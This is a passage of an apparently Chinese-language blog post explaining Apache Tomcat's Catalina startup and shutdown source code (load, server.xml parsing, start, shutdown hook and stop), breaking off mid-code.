<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  * Load using arguments</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">load</span><span class="params">(String args[])</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (arguments(args)) &#123; <span class="comment">// 处理命令行的参数</span></span><br><span class="line">            load();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace(System.out);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>load加载过程本质上是初始化Server的实例</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Start a new server instance.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">load</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果已经加载则退出</span></span><br><span class="line">    <span class="keyword">if</span> (loaded) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    loaded = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// （已经弃用）</span></span><br><span class="line">    initDirs();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Before digester - it may be needed</span></span><br><span class="line">    initNaming();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析 server.xml</span></span><br><span class="line">    parseServerXml(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Server</span> <span class="variable">s</span> <span class="operator">=</span> getServer();</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    getServer().setCatalina(<span class="built_in">this</span>);</span><br><span class="line">    getServer().setCatalinaHome(Bootstrap.getCatalinaHomeFile());</span><br><span class="line">    getServer().setCatalinaBase(Bootstrap.getCatalinaBaseFile());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Stream redirection</span></span><br><span class="line">    initStreams();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启动Server</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        getServer().init();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Boolean.getBoolean(<span class="string">&quot;org.apache.catalina.startup.EXIT_ON_INIT_FAILURE&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.lang.Error(e);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.error(sm.getString(<span class="string">&quot;catalina.initError&quot;</span>), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(log.isInfoEnabled()) &#123;</span><br><span class="line">        log.info(sm.getString(<span class="string">&quot;catalina.init&quot;</span>, Long.toString(TimeUnit.NANOSECONDS.toMillis(System.nanoTime() - t1))));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总体流程如下：</p>
<p><img src="https://pdai.tech/images/tomcat/tomcat-x-catalina-2.png" alt="img"></p>
<h3 id="initDirs"><a href="#initDirs" class="headerlink" title="# initDirs"></a><a href="#initdirs">#</a> initDirs</h3><p>已经弃用了，Tomcat10会删除这个方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@deprecated</span> unused. Will be removed in Tomcat 10 onwards.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initDirs</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="initNaming"><a href="#initNaming" class="headerlink" title="# initNaming"></a><a href="#initnaming">#</a> initNaming</h3><p>设置额外的系统变量</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initNaming</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// Setting additional variables</span></span><br><span class="line">  <span class="keyword">if</span> (!useNaming) &#123;</span><br><span class="line">      log.info(sm.getString(<span class="string">&quot;catalina.noNaming&quot;</span>));</span><br><span class="line">      System.setProperty(<span class="string">&quot;catalina.useNaming&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      System.setProperty(<span class="string">&quot;catalina.useNaming&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="string">&quot;org.apache.naming&quot;</span>;</span><br><span class="line">      <span class="type">String</span> <span class="variable">oldValue</span> <span class="operator">=</span></span><br><span class="line">          System.getProperty(javax.naming.Context.URL_PKG_PREFIXES);</span><br><span class="line">      <span class="keyword">if</span> (oldValue != <span class="literal">null</span>) &#123;</span><br><span class="line">          value = value + <span class="string">&quot;:&quot;</span> + oldValue;</span><br><span class="line">      &#125;</span><br><span class="line">      System.setProperty(javax.naming.Context.URL_PKG_PREFIXES, value);</span><br><span class="line">      <span class="keyword">if</span>( log.isDebugEnabled() ) &#123;</span><br><span class="line">          log.debug(<span class="string">&quot;Setting naming prefix=&quot;</span> + value);</span><br><span class="line">      &#125;</span><br><span class="line">      value = System.getProperty</span><br><span class="line">          (javax.naming.Context.INITIAL_CONTEXT_FACTORY);</span><br><span class="line">      <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">          System.setProperty</span><br><span class="line">              (javax.naming.Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">                <span class="string">&quot;org.apache.naming.java.javaURLContextFactory&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          log.debug(<span class="string">&quot;INITIAL_CONTEXT_FACTORY already set &quot;</span> + value );</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Server-xml的解析"><a href="#Server-xml的解析" class="headerlink" title="# Server.xml的解析"></a><a href="#server-xml%E7%9A%84%E8%A7%A3%E6%9E%90">#</a> Server.xml的解析</h3><p>分三大块，下面的代码还是很清晰的:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">parseServerXml</span><span class="params">(<span class="type">boolean</span> start)</span> &#123;</span><br><span class="line">    <span class="comment">// Set configuration source</span></span><br><span class="line">    ConfigFileLoader.setSource(<span class="keyword">new</span> <span class="title class_">CatalinaBaseConfigurationSource</span>(Bootstrap.getCatalinaBaseFile(), getConfigFile()));</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> configFile();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (useGeneratedCode &amp;&amp; !Digester.isGeneratedCodeLoaderSet()) &#123;</span><br><span class="line">        <span class="comment">// Load loader</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">loaderClassName</span> <span class="operator">=</span> generatedCodePackage + <span class="string">&quot;.DigesterGeneratedCodeLoader&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Digester.<span class="type">GeneratedCodeLoader</span> <span class="variable">loader</span> <span class="operator">=</span></span><br><span class="line">                    (Digester.GeneratedCodeLoader) Catalina.class.getClassLoader().loadClass(loaderClassName).newInstance();</span><br><span class="line">            Digester.setGeneratedCodeLoader(loader);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                log.info(sm.getString(<span class="string">&quot;catalina.noLoader&quot;</span>, loaderClassName), e);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                log.info(sm.getString(<span class="string">&quot;catalina.noLoader&quot;</span>, loaderClassName));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// No loader so don&#x27;t use generated code</span></span><br><span class="line">            useGeneratedCode = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化server.xml的位置</span></span><br><span class="line">    <span class="type">File</span> <span class="variable">serverXmlLocation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">xmlClassName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (generateCode || useGeneratedCode) &#123;</span><br><span class="line">        xmlClassName = start ? generatedCodePackage + <span class="string">&quot;.ServerXml&quot;</span> : generatedCodePackage + <span class="string">&quot;.ServerXmlStop&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (generateCode) &#123;</span><br><span class="line">        <span class="keyword">if</span> (generatedCodeLocationParameter != <span class="literal">null</span>) &#123;</span><br><span class="line">            generatedCodeLocation = <span class="keyword">new</span> <span class="title class_">File</span>(generatedCodeLocationParameter);</span><br><span class="line">            <span class="keyword">if</span> (!generatedCodeLocation.isAbsolute()) &#123;</span><br><span class="line">                generatedCodeLocation = <span class="keyword">new</span> <span class="title class_">File</span>(Bootstrap.getCatalinaHomeFile(), generatedCodeLocationParameter);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            generatedCodeLocation = <span class="keyword">new</span> <span class="title class_">File</span>(Bootstrap.getCatalinaHomeFile(), <span class="string">&quot;work&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        serverXmlLocation = <span class="keyword">new</span> <span class="title class_">File</span>(generatedCodeLocation, generatedCodePackage);</span><br><span class="line">        <span class="keyword">if</span> (!serverXmlLocation.isDirectory() &amp;&amp; !serverXmlLocation.mkdirs()) &#123;</span><br><span class="line">            log.warn(sm.getString(<span class="string">&quot;catalina.generatedCodeLocationError&quot;</span>, generatedCodeLocation.getAbsolutePath()));</span><br><span class="line">            <span class="comment">// Disable code generation</span></span><br><span class="line">            generateCode = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用 SAXParser 来解析 xml，解析完了之后，xml 里定义的各种标签就有对应的实现类对象了</span></span><br><span class="line">    <span class="type">ServerXml</span> <span class="variable">serverXml</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (useGeneratedCode) &#123;</span><br><span class="line">        serverXml = (ServerXml) Digester.loadGeneratedClass(xmlClassName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (serverXml != <span class="literal">null</span>) &#123;</span><br><span class="line">        serverXml.load(<span class="built_in">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (ConfigurationSource.<span class="type">Resource</span> <span class="variable">resource</span> <span class="operator">=</span> ConfigFileLoader.getSource().getServerXml()) &#123;</span><br><span class="line">            <span class="comment">// Create and execute our Digester</span></span><br><span class="line">            <span class="type">Digester</span> <span class="variable">digester</span> <span class="operator">=</span> start ? createStartDigester() : createStopDigester();</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> resource.getInputStream();</span><br><span class="line">            <span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(resource.getURI().toURL().toString());</span><br><span class="line">            inputSource.setByteStream(inputStream);</span><br><span class="line">            digester.push(<span class="built_in">this</span>);</span><br><span class="line">            <span class="keyword">if</span> (generateCode) &#123;</span><br><span class="line">                digester.startGeneratingCode();</span><br><span class="line">                generateClassHeader(digester, start);</span><br><span class="line">            &#125;</span><br><span class="line">            digester.parse(inputSource);</span><br><span class="line">            <span class="keyword">if</span> (generateCode) &#123;</span><br><span class="line">                generateClassFooter(digester);</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="keyword">new</span> <span class="title class_">File</span>(serverXmlLocation,</span><br><span class="line">                        start ? <span class="string">&quot;ServerXml.java&quot;</span> : <span class="string">&quot;ServerXmlStop.java&quot;</span>))) &#123;</span><br><span class="line">                    writer.write(digester.getGeneratedCode().toString());</span><br><span class="line">                &#125;</span><br><span class="line">                digester.endGeneratingCode();</span><br><span class="line">                Digester.addGeneratedClass(xmlClassName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.warn(sm.getString(<span class="string">&quot;catalina.configFail&quot;</span>, file.getAbsolutePath()), e);</span><br><span class="line">            <span class="keyword">if</span> (file.exists() &amp;&amp; !file.canRead()) &#123;</span><br><span class="line">                log.warn(sm.getString(<span class="string">&quot;catalina.incorrectPermissions&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="initStreams"><a href="#initStreams" class="headerlink" title="# initStreams"></a><a href="#initstreams">#</a> initStreams</h3><p>替换掉System.out, System.err为自定义的PrintStream</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">initStreams</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Replace System.out and System.err with a custom PrintStream</span></span><br><span class="line">    System.setOut(<span class="keyword">new</span> <span class="title class_">SystemLogHandler</span>(System.out));</span><br><span class="line">    System.setErr(<span class="keyword">new</span> <span class="title class_">SystemLogHandler</span>(System.err));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Catalina-的启动"><a href="#Catalina-的启动" class="headerlink" title="# Catalina 的启动"></a><a href="#catalina-%E7%9A%84%E5%90%AF%E5%8A%A8">#</a> Catalina 的启动</h2><p>在 load 方法之后，Tomcat 就初始化了一系列的组件，接着就可以调用 start 方法进行启动了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Start a new server instance.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getServer() == <span class="literal">null</span>) &#123;</span><br><span class="line">        load();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getServer() == <span class="literal">null</span>) &#123;</span><br><span class="line">        log.fatal(sm.getString(<span class="string">&quot;catalina.noServer&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Start the new server</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        getServer().start();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (LifecycleException e) &#123;</span><br><span class="line">        log.fatal(sm.getString(<span class="string">&quot;catalina.serverStartFail&quot;</span>), e);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            getServer().destroy();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LifecycleException e1) &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;destroy() failed for failed Server &quot;</span>, e1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="variable">t2</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">    <span class="keyword">if</span>(log.isInfoEnabled()) &#123;</span><br><span class="line">        log.info(sm.getString(<span class="string">&quot;catalina.startup&quot;</span>, Long.valueOf((t2 - t1) / <span class="number">1000000</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Register shutdown hook</span></span><br><span class="line">    <span class="keyword">if</span> (useShutdownHook) &#123;</span><br><span class="line">        <span class="keyword">if</span> (shutdownHook == <span class="literal">null</span>) &#123;</span><br><span class="line">            shutdownHook = <span class="keyword">new</span> <span class="title class_">CatalinaShutdownHook</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        Runtime.getRuntime().addShutdownHook(shutdownHook);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If JULI is being used, disable JULI&#x27;s shutdown hook since</span></span><br><span class="line">        <span class="comment">// shutdown hooks run in parallel and log messages may be lost</span></span><br><span class="line">        <span class="comment">// if JULI&#x27;s hook completes before the CatalinaShutdownHook()</span></span><br><span class="line">        <span class="type">LogManager</span> <span class="variable">logManager</span> <span class="operator">=</span> LogManager.getLogManager();</span><br><span class="line">        <span class="keyword">if</span> (logManager <span class="keyword">instanceof</span> ClassLoaderLogManager) &#123;</span><br><span class="line">            ((ClassLoaderLogManager) logManager).setUseShutdownHook(</span><br><span class="line">                    <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (await) &#123;</span><br><span class="line">        await();</span><br><span class="line">        stop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这段代码，逻辑非常简单，首先确定 getServer() 方法不为 null ，也就是确定 server 属性不为null，而 server 属性是在 load 方法就初始化了。</p>
<p>整段代码的核心就是 try-catch 里的 getServer().start() 方法了，也就是调用 Server 对象的 start() 方法来启动 Tomcat。本篇文章就先不对 Server 的 start() 方法进行解析了，下篇文章会单独讲。</p>
<h2 id="Catalina-的关闭"><a href="#Catalina-的关闭" class="headerlink" title="# Catalina 的关闭"></a><a href="#catalina-%E7%9A%84%E5%85%B3%E9%97%AD">#</a> Catalina 的关闭</h2><p>调用完 Server#start 方法之后，注册了一个ShutDownHook，也就是 CatalinaShutdownHook 对象，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Shutdown hook which will perform a clean shutdown of Catalina if needed.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">class</span> <span class="title class_">CatalinaShutdownHook</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (getServer() != <span class="literal">null</span>) &#123;</span><br><span class="line">              Catalina.<span class="built_in">this</span>.stop();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">          ExceptionUtils.handleThrowable(ex);</span><br><span class="line">          log.error(sm.getString(<span class="string">&quot;catalina.shutdownHookFail&quot;</span>), ex);</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          <span class="comment">// If JULI is used, shut JULI down *after* the server shuts down</span></span><br><span class="line">          <span class="comment">// so log messages aren&#x27;t lost</span></span><br><span class="line">          <span class="type">LogManager</span> <span class="variable">logManager</span> <span class="operator">=</span> LogManager.getLogManager();</span><br><span class="line">          <span class="keyword">if</span> (logManager <span class="keyword">instanceof</span> ClassLoaderLogManager) &#123;</span><br><span class="line">              ((ClassLoaderLogManager) logManager).shutdown();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>CatalinaShutdownHook 的逻辑也简单，就是调用 Catalina 对象的 stop 方法来停止 tomcat。</p>
<p>最后就进入 if 语句了，await 是在 Bootstrap 里调用的时候设置为 true 的，也就是本文开头的时候提到的三个方法中的一个。await 方法的作用是停住主线程，等待用户输入shutdown 命令之后，停止等待，之后 main 线程就调用 stop 方法来停止Tomcat。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Stop an existing server instance.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Remove the ShutdownHook first so that server.stop()</span></span><br><span class="line">        <span class="comment">// doesn&#x27;t get invoked twice</span></span><br><span class="line">        <span class="keyword">if</span> (useShutdownHook) &#123;</span><br><span class="line">            Runtime.getRuntime().removeShutdownHook(shutdownHook);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If JULI is being used, re-enable JULI&#x27;s shutdown to ensure</span></span><br><span class="line">            <span class="comment">// log messages are not lost</span></span><br><span class="line">            <span class="type">LogManager</span> <span class="variable">logManager</span> <span class="operator">=</span> LogManager.getLogManager();</span><br><span class="line">            <span class="keyword">if</span> (logManager <span class="keyword">instanceof</span> ClassLoaderLogManager) &#123;</span><br><span class="line">                ((ClassLoaderLogManager) logManager).setUseShutdownHook(</span><br><span class="line">                        <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        ExceptionUtils.handleThrowable(t);</span><br><span class="line">        <span class="comment">// This will fail on JDK 1.2. Ignoring, as Tomcat can run</span></span><br><span class="line">        <span class="comment">// fine without the shutdown hook.</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Shut down the server</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Server</span> <span class="variable">s</span> <span class="operator">=</span> getServer();</span><br><span class="line">        <span 